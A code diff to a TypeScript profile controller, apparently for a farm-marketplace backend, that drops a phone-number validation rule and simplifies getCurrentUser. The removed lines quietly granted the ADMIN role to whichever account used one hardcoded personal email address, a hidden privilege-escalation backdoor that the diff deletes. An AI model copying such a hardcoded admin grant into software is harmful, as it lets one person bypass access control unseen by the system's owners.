@@ -9,7 +9,6 @@ import { signToken } from '../utils/jwtUtils';
 const updateProfileSchema = z.object({
   name: z.string().min(1).optional(),
   email: z.string().email().optional(),
-  phone: z.string().regex(/^[6-9]\d{9}$/, "Must be a valid 10-digit Indian mobile number").optional(),
   village: z.string().optional(),
   district: z.string().optional(),
   state: z.string().optional(),
@@ -43,22 +42,7 @@ const updateProfileSchema = z.object({
   waterSource: z.string().optional(),
 });
 
-const getCurrentUser = async (userId: string) => {
-  let dbUser = await prisma.user.findUnique({ where: { id: userId } });
-
-  if (!dbUser) {
-    return null;
-  }
-
-  if (dbUser.email === 'harshindoria911@gmail.com' && !dbUser.roles.includes('ADMIN')) {
-    dbUser = await prisma.user.update({
-      where: { id: userId },
-      data: { roles: [...dbUser.roles, 'ADMIN'] }
-    });
-  }
-
-  return dbUser;
-};
+const getCurrentUser = (userId: string) => prisma.user.findUnique({ where: { id: userId } });
 
 export const buyerProfile = async (req: Request, res: Response): Promise<void> => {
   try {
